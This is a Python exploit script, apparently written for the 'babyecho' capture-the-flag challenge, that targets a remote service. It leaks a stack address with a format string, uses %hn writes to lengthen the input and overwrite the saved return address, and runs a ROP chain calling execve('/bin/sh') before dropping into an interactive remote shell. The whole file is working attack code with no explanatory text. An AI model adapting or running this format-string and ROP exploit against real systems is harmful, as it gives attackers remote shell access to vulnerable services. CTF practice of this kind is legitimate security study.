#!/usr/bin/env python
import sc_pwn
from struct import *
import sys

#rhp     = ('192.168.75.129',8080)
rhp     = ('babyecho_eb11fdf6e40236b1a37b7974c53b6c3d.quals.shallweplayaga.me',3232)

addr_pop_esp    = 0x08099f94
addr_pop_eax    = 0x080bb396    # pop eax ; ret
addr_pop_x3     = 0x0806efb0    # pop edx ; pop ecx ; pop ebx ; ret
addr_int80      = 0x080495c1

sh              = '/bin/sh\x00'
syscall_execve  = 0xb
null            = 0

out_len = lambda x: "%"+str(x if x>0 else 0x10000+x)+"x" if x!=0 else ""

#==========
def attack(nc):
    """
    nc.read_until('bytes\n')
    nc.sendln("%263$08x")
    canary = int(nc.read_until('\n')[0:-1],16)
    """
    nc.read_until('bytes\n')
    nc.sendln("%5$08x")
    
    addr_stack_str  = int(nc.read_until('\n')[0:-1],16)
    addr_stack_len  = addr_stack_str - 0xc   
    addr_stack_flg  = addr_stack_str - 0x4 
    addr_stack_sh   = addr_stack_str + 0x8
    addr_stack_rop  = addr_stack_str + 0x10
    addr_stack_ret  = addr_stack_str + 0x410
    sys.stdout.write("[+]addr_stack_str     = 0x%08x\n"%addr_stack_str)
    sys.stdout.write("[+]addr_stack_ret     = 0x%08x\n"%addr_stack_ret)

    exploits = []

    exploit  = pack("<I",addr_stack_len+2)
    exploit += '%7$hn'
    exploits+= [exploit]

    exploit  = pack("<I",addr_stack_ret)
    exploit += pack("<I",addr_stack_ret+2)
    exploit += out_len((addr_pop_esp>>0x10)-len(exploit))
    exploit += '%8$hn'
    exploit += out_len((addr_pop_esp&0xffff)-(addr_pop_esp>>0x10))
    exploit += '%7$hn'
    exploits+= [exploit]

    exploit  = pack("<I",addr_stack_ret+4)
    exploit += pack("<I",addr_stack_ret+6)
    exploit += out_len((addr_stack_rop&0xffff)-len(exploit))
    exploit += '%7$hn'
    exploit += out_len((addr_stack_rop>>0x10)-(addr_stack_rop&0xffff))
    exploit += '%8$hn'
    exploits+= [exploit]

    payload  = pack("<I",addr_stack_flg)
    payload += '%7$n'
    payload += sh
    payload += pack("<I",addr_pop_eax)
    payload += pack("<I",syscall_execve)
    payload += pack("<I",addr_pop_x3)
    payload += pack("<I",null)
    payload += pack("<I",null)
    payload += pack("<I",addr_stack_sh)
    payload += pack("<I",addr_int80)

    for exploit in exploits:
        nc.read_until('bytes\n')
        nc.sendln(exploit)

    nc.read_until('bytes\n')
    nc.sendln(payload)
    
    nc.read_all()

#==========

if __name__=='__main__':
    nc = sc_pwn.Communicate(rhp)
    attack(nc)

    sh = sc_pwn.Shell(nc)
    sh.select()

    del(sh)
    del(nc)
    
#==========
